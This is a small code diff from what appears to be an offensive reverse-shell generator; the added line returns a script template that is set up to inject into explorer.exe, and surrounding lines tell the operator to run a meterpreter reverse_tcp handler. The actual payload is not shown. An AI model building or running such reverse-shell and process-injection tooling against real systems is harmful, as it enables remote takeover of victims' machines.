@@ -149,6 +149,7 @@ class ReverseShell(object):
                 self.code = malicious_script.replace("PROCESSNAME", "explorer") # we want inject into explorer.exe
                 print(alert("Make sure you have a handler for windows/x64/meterpreter/reverse_tcp listening in your machine."))
                 print(alert("It is recommended to use the --base64 flag."))
+                return self.code # we dont need encoder in this one.
             else:
                 print(error("No custom shell procedure was arranged for this shell. This is fatal."))
                 exit(1)
